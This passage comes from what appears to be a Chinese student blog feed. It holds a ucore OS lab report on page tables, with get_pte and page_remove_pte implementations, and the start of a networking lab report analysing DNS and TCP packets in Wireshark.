class="line"><span class="meta">#<span class="meta-keyword">define</span> PDE_ADDR(pde)   PTE_ADDR(pde)</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PDXSHIFT        22                      <span class="comment">// offset of PDX in a linear address</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTXSHIFT        12                      <span class="comment">// offset of PTX in a linear address  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PDX(la) ((((uintptr_t)(la)) &gt;&gt; PDXSHIFT) &amp; 0x3FF)    <span class="comment">//一级页目录表的下标</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTX(la) ((((uintptr_t)(la)) &gt;&gt; PTXSHIFT) &amp; 0x3FF)    <span class="comment">//</span></span></span><br></pre></td></tr></table></figure></div>
<p>get_pte函数<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get_pte - get pte and return the kernel virtual address of this pte for la</span></span><br><span class="line"><span class="comment">//        - if the PT contians this pte didn't exist, alloc a page for PT</span></span><br><span class="line"><span class="comment">// parameter:</span></span><br><span class="line"><span class="comment">//  pgdir:  the kernel virtual base address of PDT</span></span><br><span class="line"><span class="comment">//  la:     the linear address need to map</span></span><br><span class="line"><span class="comment">//  create: a logical value to decide if alloc a page for PT</span></span><br><span class="line"><span class="comment">// return vaule: the kernel virtual address of this pte</span></span><br><span class="line"><span class="keyword">pte_t</span> *</span><br><span class="line">get_pte(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">bool</span> create) &#123;</span><br><span class="line">    <span class="comment">/* LAB2 EXERCISE 2: YOUR CODE</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If you need to visit a physical address, please use KADDR()</span></span><br><span class="line"><span class="comment">     * please read pmm.h for useful macros</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Maybe you want help comment, BELOW comments can help you finish the code</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Some Useful MACROs and DEFINEs, you can use them in below implementation.</span></span><br><span class="line"><span class="comment">     * MACROs or Functions:</span></span><br><span class="line"><span class="comment">     *   PDX(la) = the index of page directory entry of VIRTUAL ADDRESS la.</span></span><br><span class="line"><span class="comment">     *   KADDR(pa) : takes a physical address and returns the corresponding kernel virtual address.</span></span><br><span class="line"><span class="comment">     *   set_page_ref(page,1) : means the page be referenced by one time</span></span><br><span class="line"><span class="comment">     *   page2pa(page): get the physical address of memory which this (struct Page *) page  manages</span></span><br><span class="line"><span class="comment">     *   struct Page * alloc_page() : allocation a page</span></span><br><span class="line"><span class="comment">     *   memset(void *s, char c, size_t n) : sets the first n bytes of the memory area pointed by s</span></span><br><span class="line"><span class="comment">     *                                       to the specified value c.</span></span><br><span class="line"><span class="comment">     * DEFINEs:</span></span><br><span class="line"><span class="comment">     *   PTE_P           0x001                   // page table/directory entry flags bit : Present</span></span><br><span class="line"><span class="comment">     *   PTE_W           0x002                   // page table/directory entry flags bit : Writeable</span></span><br><span class="line"><span class="comment">     *   PTE_U           0x004                   // page table/directory entry flags bit : User can access</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pdep = <span class="literal">NULL</span>;   <span class="comment">// (1) find page directory entry</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span>) &#123;              <span class="comment">// (2) check if entry is not present</span></span><br><span class="line">                          <span class="comment">// (3) check if creating is needed, then alloc page for page table</span></span><br><span class="line">                          <span class="comment">// CAUTION: this page is used for page table, not for common data page</span></span><br><span class="line">                          <span class="comment">// (4) set page reference</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pa = <span class="number">0</span>; <span class="comment">// (5) get linear address of page</span></span><br><span class="line">                          <span class="comment">// (6) clear page content using memset</span></span><br><span class="line">                          <span class="comment">// (7) set page directory entry's permission</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;          <span class="comment">// (8) return page table entry</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>pgdir:   PDT（页目录索引表）的内核虚地址<br>la:    需要映射的线性地址<br>create: 一个决定是否要分配一个页面给PT（页表）的逻辑值</p>
<p>按照注释提示在#endif后添加如下代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">pde_t</span> *pdep = &amp;pgdir[PDX(la)]; <span class="comment">// (1)获取页目录项，*pdep是la所在的二级页表的物理地址，PDX(la)一级页目录表的下标，此运算其实是pgdir基址+PDX(la)偏移量，由在一级页目录表中查找得到二级页表的地址</span></span><br><span class="line"><span class="comment">// 找到PDE这里的pgdir可以看做是页目录表的基址</span></span><br><span class="line">   <span class="keyword">if</span> (!(*pdep &amp; PTE_P)) &#123;  <span class="comment">// (2)假设页目录项不存在</span></span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">Page</span>* <span class="title">page</span> = <span class="title">alloc_page</span>();</span></span><br><span class="line">       <span class="comment">/* 通过 default_alloc_pages()分配的页的地址并不是真正的页分配的地址，</span></span><br><span class="line"><span class="comment">           实际上只是Page这个结构体所在的地址而已，因而需要通过使用page2pa()将Page这个结构体的地址</span></span><br><span class="line"><span class="comment">           转换成真正的物理页地址的线性地址，并且需要注意的是无论是*或是memset都是对虚拟地址进行操作的，</span></span><br><span class="line"><span class="comment">           所以需要将真正的物理页地址再转换成内核虚拟地址</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">    <span class="keyword">if</span> (!create || page == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125; <span class="comment">//假如不需要分配或是分配失败</span></span><br><span class="line">       set_page_ref(page, <span class="number">1</span>); <span class="comment">// (4)设置被引用1次</span></span><br><span class="line">       <span class="keyword">uintptr_t</span> pa =  page2pa(page); <span class="comment">// (5)得到该页物理地址</span></span><br><span class="line">       <span class="built_in">memset</span>(KADDR(pa), <span class="number">0</span>, PGSIZE);  <span class="comment">// (6)物理地址转虚拟地址，并初始化</span></span><br><span class="line">	<span class="comment">// 将这一页清空此时将线性地址转换为内核虚拟地址</span></span><br><span class="line">       *pdep = pa | PTE_U | PTE_W | PTE_P; <span class="comment">// (7)设置PDE权限，设置可读，可写，有效</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &amp;((<span class="keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)))[PTX(la)];</span><br><span class="line">   <span class="comment">//由于此时*pdep是查到的页目录项，其实也就是la所在的二级页表的物理地址，用PDE_ADDR对其后12位进行截断后使用KADDR进行虚化，得到PTT(页表索引表)的虚地址，用PTX(la)截取中间0x3ff(10位)的二级页表的下标，两者结合得到所寻的页表项PTE</span></span><br></pre></td></tr></table></figure></div>
<p>make clean后重新make clean，得到如下结果</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200327134230400.png" alt="image-20200327134230400"></p>
<p>可以发现get_pte的错误消失，显示了新的错误，需在练习3解决</p>
<blockquote>
<p>请描述页目录项（Page Directory Entry）和页表项（Page Table Entry）中每个组成部分的含义以及对ucore而言的潜在用处。</p>
</blockquote>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/Page_dir.png" alt="PDE 详解"></p>
<p>从低到高，分别是：</p>
<ul>
<li><em>P</em> (Present) 位：表示该页保存在物理内存中。</li>
<li><em>R</em> (Read/Write) 位：表示该页可读可写。</li>
<li><em>U</em> (User) 位：表示该页可以被任何权限用户访问。</li>
<li><em>W</em> (Write Through) 位：表示 CPU 可以直写回内存。</li>
<li><em>D</em> (Cache Disable) 位：表示不需要被 CPU 缓存。</li>
<li><em>A</em> (Access) 位：表示该页被访问过。</li>
<li><em>S</em> (Size) 位：表示一个页 4MB 。</li>
<li>9-11 位保留给 OS 使用。</li>
<li>12-31 位指明 PTE 基质地址。</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/Page_table-1585330806618.png" alt="PTE 详解"></p>
<p>从低到高，分别是：</p>
<ul>
<li>0-3 位同 PDE。</li>
<li><em>C</em> (Cache Disable) 位：同 PDE <em>D</em> 位。</li>
<li><em>A</em> (Access) 位：同 PDE 。</li>
<li><em>D</em> (Dirty) 位：表示该页被写过。</li>
<li><em>G</em> (Global) 位：表示在 CR3 寄存器更新时无需刷新 TLB 中关于该页的地址。</li>
<li>9-11 位保留给 OS 使用。</li>
<li>12-31 位指明物理页基址。</li>
</ul>
<blockquote>
<p>如果ucore执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</p>
</blockquote>
<p><strong>使能页机制</strong>：</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200328093548814.png" alt="image-20200328093548814"></p>
<p><strong>Cr0系列的控制寄存器：</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>寄存器名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>CR0</td>
<td>包含处理器标志控制位，如PE,PG,WP等</td>
</tr>
<tr>
<td>CR1</td>
<td>保留</td>
</tr>
<tr>
<td>CR2</td>
<td>专门用于保存缺页异常时的线性地址</td>
</tr>
<tr>
<td>CR3</td>
<td>保存进程页目录地址</td>
</tr>
<tr>
<td>CR4</td>
<td>扩展功能（如判断物理地址扩展模式等），Pentium系列(包括486的后期版本)处理器中才实现</td>
</tr>
</tbody>
</table>
</div>
<p>如果出现了页访问异常，那么硬件将引发页访问异常的地址将被保存在cr2寄存器中，设置错误代码，然后触发Page Fault异常。</p>
<h2 id="练习3：释放某虚地址所在的页并取消对应二级页表项的映射"><a href="#练习3：释放某虚地址所在的页并取消对应二级页表项的映射" class="headerlink" title="练习3：释放某虚地址所在的页并取消对应二级页表项的映射"></a>练习3：释放某虚地址所在的页并取消对应二级页表项的映射</h2><p>当释放一个包含某虚地址的物理内存页时，需要让对应此物理内存页的管理数据结构Page做相关的清除处理，使得此物理内存页成为空闲；另外还需把表示虚地址与物理地址对应关系的二级页表项清除。请仔细查看和理解page_remove_pte函数中的注释。为此，需要补全在 kern/mm/pmm.c中的page_remove_pte函数。page_remove_pte函数的调用关系图如下所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image002.png" alt="img"></p>
<p>图2 page_remove_pte函数的调用关系图</p>
<p>请在实验报告中简要说明你的设计实现过程。请回答如下问题：</p>
<ul>
<li>数据结构Page的全局变量（其实是一个数组）的每一项与页表中的页目录项和页表项有无对应关系？如果有，其对应关系是啥？</li>
<li>如果希望虚拟地址与物理地址相等，则需要如何修改lab2，完成此事？ <strong>鼓励通过编程来具体完成这个问题</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//page_remove_pte - free an Page sturct which is related linear address la</span></span><br><span class="line"><span class="comment">//                - and clean(invalidate) pte which is related linear address la</span></span><br><span class="line"><span class="comment">//note: PT is changed, so the TLB need to be invalidate </span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">page_remove_pte(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">pte_t</span> *ptep) &#123;</span><br><span class="line">    <span class="comment">/* LAB2 EXERCISE 3: YOUR CODE</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Please check if ptep is valid, and tlb must be manually updated if mapping is updated</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Maybe you want help comment, BELOW comments can help you finish the code</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Some Useful MACROs and DEFINEs, you can use them in below implementation.</span></span><br><span class="line"><span class="comment">     * MACROs or Functions:</span></span><br><span class="line"><span class="comment">     *   struct Page *page pte2page(*ptep): get the according page from the value of a ptep</span></span><br><span class="line"><span class="comment">     *   free_page : free a page</span></span><br><span class="line"><span class="comment">     *   page_ref_dec(page) : decrease page-&gt;ref. NOTICE: ff page-&gt;ref == 0 , then this page should be free.</span></span><br><span class="line"><span class="comment">     *   tlb_invalidate(pde_t *pgdir, uintptr_t la) : Invalidate a TLB entry, but only if the page tables being</span></span><br><span class="line"><span class="comment">     *                        edited are the ones currently in use by the processor.</span></span><br><span class="line"><span class="comment">     * DEFINEs:</span></span><br><span class="line"><span class="comment">     *   PTE_P           0x001                   // page table/directory entry flags bit : Present</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span>) &#123;                      <span class="comment">//(1) check if page directory is present</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">NULL</span>;</span> <span class="comment">//(2) find corresponding page to pte</span></span><br><span class="line">                                  <span class="comment">//(3) decrease page reference</span></span><br><span class="line">                                  <span class="comment">//(4) and free this page when page reference reachs 0</span></span><br><span class="line">                                  <span class="comment">//(5) clear second page table entry</span></span><br><span class="line">                                  <span class="comment">//(6) flush tlb</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/Page_table-1585330806618-1585365302146.png" alt="PTE 详解"></p>
<p>pmm.h部分函数定义</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">uintptr_t</span> <span class="keyword">pte_t</span>;</span><br><span class="line"><span class="comment">//页表/目录条目标志位：P (Present) 位：表示该页保存在物理内存中。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_P           0x001                   <span class="comment">// Present</span></span></span><br><span class="line"><span class="comment">//释放1页空间</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> free_page(page) free_pages(page, 1) </span></span><br><span class="line"><span class="comment">//从ptep的值获取相应的页面</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *</span></span><br><span class="line"><span class="class"><span class="title">pte2page</span>(<span class="title">pte_t</span> <span class="title">pte</span>) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (!(pte &amp; PTE_P)) &#123;</span><br><span class="line">        panic(<span class="string">"pte2page called with invalid pte"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pa2page(PTE_ADDR(pte));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//页面引用计数减1</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span><br><span class="line">page_ref_dec(struct Page *page) &#123;</span><br><span class="line">    page-&gt;ref -= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> page-&gt;ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>按照注释在#endif后添加如下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((*ptep &amp; PTE_P)) &#123;<span class="comment">//判断页表入口是否存在，P (Present) 位：表示该页保存在物理内存中。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">pte2page</span>(*<span class="title">ptep</span>);</span><span class="comment">//从ptep的值获取相应的页面</span></span><br><span class="line">    <span class="keyword">if</span> (page_ref_dec(page) == <span class="number">0</span>) &#123; <span class="comment">// 若引用计数减一后为0 则释放该物理页</span></span><br><span class="line">        free_page(page);</span><br><span class="line">    &#125;</span><br><span class="line">    *ptep = <span class="number">0</span>; <span class="comment">// 清空 PTE</span></span><br><span class="line">    tlb_invalidate(pgdir, la); <span class="comment">// 刷新 tlb</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>make clean 后重新make qemu得到如下结果</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200327144600830.png" alt="image-20200327144600830"></p>
<p>另外，对于lab1的challenge1的代码，似乎不能在lab2正常运行</p>
<p>当键入0时，会出现缺页异常</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200327193848787.png" alt="image-20200327193848787"></p>
<p>遂将其注释便运行正常</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200327193749004.png" alt="image-20200327193749004"></p>
<blockquote>
<p>数据结构Page的全局变量（其实是一个数组）的每一项与页表中的页目录项和页表项有无对应关系？如果有，其对应关系是啥？</p>
</blockquote>
<p>有。</p>
<p>查看pmm.h      PDE, PTE与page之间的转化</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">ppn_t</span></span><br><span class="line">page2ppn(struct Page *page) &#123;</span><br><span class="line">    <span class="keyword">return</span> page - pages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uintptr_t</span></span><br><span class="line">page2pa(struct Page *page) &#123;</span><br><span class="line">    <span class="keyword">return</span> page2ppn(page) &lt;&lt; PGSHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *</span></span><br><span class="line"><span class="class"><span class="title">pa2page</span>(<span class="title">uintptr_t</span> <span class="title">pa</span>) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (PPN(pa) &gt;= npage) &#123;</span><br><span class="line">        panic(<span class="string">"pa2page called with invalid pa"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;pages[PPN(pa)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *</span></span><br><span class="line"><span class="class"><span class="title">pte2page</span>(<span class="title">pte_t</span> <span class="title">pte</span>) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (!(pte &amp; PTE_P)) &#123;</span><br><span class="line">        panic(<span class="string">"pte2page called with invalid pte"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pa2page(PTE_ADDR(pte));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *</span></span><br><span class="line"><span class="class"><span class="title">pde2page</span>(<span class="title">pde_t</span> <span class="title">pde</span>) &#123;</span></span><br><span class="line">    <span class="keyword">return</span> pa2page(PDE_ADDR(pde));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>VPN: 虚拟分页地址 virtual page number</p>
<p>PPN: 物理分页地址 physical page number</p>
<p>页目录项或页表项的前20位表示它对应的是哪个Page。</p>
<blockquote>
<p>如果希望虚拟地址与物理地址相等，则需要如何修改lab2，完成此事？ </p>
</blockquote>
<p>虚地址和物理地址之间有一个偏移，即存在映射关系：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">phy addr + KERNBASE = <span class="keyword">virtual</span> addr</span><br></pre></td></tr></table></figure></div>
<p>KERNBASE为虚拟地址空间中的内核基址，即偏移量。<br>查看lab2/kern/mm/memlayout.h，得知其定义的<code>KERNBASE</code>是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNBASE 0xC0000000</span></span><br></pre></td></tr></table></figure></div>
<p>将其改为<code>0x0</code>即可使得虚拟地址与物理地址相等</p>
<p>通过ld工具形成的ucore的起始虚拟地址从0xC0100000开始，而bootloader把ucore放在了起始物理地址为0x100000的物理内存空间。要使得虚拟地址与物理地址相等：</p>
<p>tools/kernel.ld</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">SECTIONS &#123;</span><br><span class="line">    &#x2F;* Load the kernel at this address: &quot;.&quot; means the current address *&#x2F;</span><br><span class="line">    . &#x3D; 0xC0100000;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>修改链接脚本，将内核起始虚拟地址<code>0xC0100000</code>修改为<code>0x100000</code></p>
<h1 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h1><p>本次实验是关于物理内存管理，主要有物理内存分配和建立页表的相关实验，了解了如何对物理内存进行初步管理和对页表的相关操作。所有的编程内容涉及到的代码量繁多，需要查找分析代码里宏定义和函数定义来完成对已有代码的理解和要完成代码的使用。通过本次实验我深入理解了段页式内存管理机制，对课程内容有了更深的理解。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>计网实验——运输层和应用层协议分析</title>
    <url>/posts/55d1396f/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>目的：分析TCP和重要的应用层协议<br>内容：</p>
<ul>
<li>任务1：DNS服务</li>
<li>任务2：TCP协议分析</li>
<li>任务3：HTTP协议分析</li>
<li>任务4：FTP协议分析<a id="more"></a></li>
</ul>
<h1 id="实验内容与分析"><a href="#实验内容与分析" class="headerlink" title="实验内容与分析"></a>实验内容与分析</h1><h2 id="任务1：DNS服务"><a href="#任务1：DNS服务" class="headerlink" title="任务1：DNS服务"></a>任务1：DNS服务</h2><h3 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求"></a>任务要求</h3><p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227154352387.png" alt="image-20191227154352387"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227154429602.png" alt="image-20191227154429602"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191225153235283.png" alt="image-20191225153235283"></p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>（1）</p>
<p>在配置完DNS环境后，首先要清空DNS缓存</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure></div>
<p>开启Wireshark进行抓包，笔者自己电脑的DNS服务器是<strong>172.16.9.1</strong>，首先将DNS服务器指向自己电脑，进行对自己配置的域名和邻居配置的域名的查询</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/9ef42933acf6f9e995509c1b84da58f5.png" alt="9ef42933acf6f9e995509c1b84da58f5"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/230906d948740128c1bbcb2f4fb0d9b4.png" alt="230906d948740128c1bbcb2f4fb0d9b4"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/9ebd56094206ada85d5c50289859084c.png" alt="9ebd56094206ada85d5c50289859084c"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/b5c14b64bdc61dd560da7812da3f3f4a.png" alt="b5c14b64bdc61dd560da7812da3f3f4a"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/9ddd09acae2c18757a2f75d4430c07da.png" alt="9ddd09acae2c18757a2f75d4430c07da"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/7f31185af89013588210a0c1ba78360f.png" alt="7f31185af89013588210a0c1ba78360f"></p>
<p>观察一对DNS报文如下</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227180830966.png" alt="image-20191227180830966"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227180914682.png" alt="image-20191227180914682"></p>
<p>DNS报文格式如下</p>
<p><style><br>    th,td<br>    {<br>        text-align:center;<br>    }
</style></p>
<table>
    <col style="width: 50%">
    <col style="width: 50%">
  <tr>
      <th>0~15</th>
      <th>16~31</th>
  </tr>
  <tr>
      <td>标识ID</td>
      <td>标志</td>
  </tr>  
  <tr>
    <td>问题数</td>
    <td>资源记录数</td>
  </tr>
  <tr>
    <td>授权资源记录数</td>
    <td>额外资源记录数</td>
  </tr>
  <tr>
     <td colspan="2">查询问题</td>
  </tr>
  <tr>
    <td colspan="2">回答</td>
  </tr>
  <tr>
    <td colspan="2">授权信息</td>
  </tr>
  <tr>
    <td colspan="2">额外信息</td>
  </tr>  
</table>

<p>Transaction ID: 标识字段，客户通过标识字段来确定DNS响应是否与查询请求匹配，占16位。图中请求和回复报文该值均为0x2e15。<br>Flags: 标志，占16位，请求报文为0x0000，回复报文为0x8480，分为下面10个标志<br>&emsp;&emsp;Response: 占1位，操作类型：0：查询报文1：响应报文<br>&emsp;&emsp;Opcode: 占1位，查询类型：0：标准查询1：反向查询2：服务器状态查询3～15：保留未用 反向查询是客户端请求服务器根据回答生成导致此回答的问题，这个查询类型的使用并不多。<br> &emsp;&emsp;Authoritative: 占1位，若置位，则表示该域名解析服务器是授权回答该域的。<br> &emsp;&emsp;Truncated: 占1位，若置位，则表示报文被截断。 使用UDP传输时，应答的总长度超过512字节时，只返回报文的前512个字节内容。<br>&emsp;&emsp;Recursion desired: 占1位，客户端希望域名解析服务器采取的解析方式： 0：表示希望域名解析服务器采取迭代解析1：表示希望域名解析服务器采取递归解析<br> &emsp;&emsp;Recursion available: 占1位，域名解析服务器采取的解析方式： 0：表示域名解析服务器采取迭代解析1：表示域名解析服务器采取递归解析<br>&emsp;&emsp;Z: 占3位，全部置0，保留未用。<br>&emsp;&emsp;Answer authenticated: 占1位，应答认证：应答/权限部分未由服务器进行认证 ，0为应答服务器未验证了该查询相关的 DNSSEC 数字签名，1 为应答服务器已经验证了该查询相关的 DNSSEC 数字签名<br>&emsp;&emsp;Non-authenticated data: 占1位，非授权数据访问，0表示不可接受，1表示可接受<br> &emsp;&emsp;Reply code: 占4位，响应类型： 0：无差错1：查询格式错2：服务器失效3：域名不存在4：查询没有被执行5：查询被拒绝6-15: 保留未用<br>Questions:无符号16位整数表示报文请求段中的问题记录数，占16位。<br>Answer RRs:无符号16位整数表示报文回答段中的回答记录数，占16位<br>Authority RRs:无符号16位整数表示报文授权段中的授权记录数，占16位<br>Additional RRs:无符号16位整数表示报文附加段中的附加记录数，占16位<br>Queries:查询的问题<br>Anwers:问题的回答<br>Authoritative nameservers:授权信息<br>Additional records:额外信息</p>
<p>（2）</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227181801707.png" alt="image-20191227181801707"></p>
<p>这些DNS报文的作用是用于标准查询或者反向查询域名。</p>
<p>从Recursion desired关键字可看出请求报文是迭代查询还是递归查询</p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227203543383.png" alt="image-20191227203543383"></p>
<p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191227203643144.png" alt="image-20191227203643144"></p>
<p>从6161(递归查询),6162(迭代查询)可以看出，当用自己的主机作为域名服务器，查询邻居域名时，先进行递归查询（向本地DNS服务器询问)，再进行迭代查询(本地DNS服务器向其他DNS服务器询问）</p>
<p>（3）</p>
<p>上述步骤中，当用域名查询IP时，nslookup返回的结果是<strong>非权威的</strong>，如果将DNS服务器指向该邻居，再查询域名，这时nslookup返回的结果是<strong>权威的</strong>。这是因为如果DNS服务器在自己的区域文件里找到了客户端需要查询的记录，就会返回一个权威性应答，否则是非权威性应答。</p>
<h2 id="任务2：-TCP协议分析"><a href="#任务2：-TCP协议分析" class="headerlink" title="任务2： TCP协议分析"></a>任务2： TCP协议分析</h2><h3 id="任务要求1"><a href="#任务要求1" class="headerlink" title="任务要求1"></a>任务要求1</h3><p><img src="/images/loading.gif" data-original="/posts/55d1396f/image-20191225170741851.png" alt="image-20191225170741851"></p>
<h3 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h3><p>在虚拟机内输入如下命令,同时开启Wireshark</p>
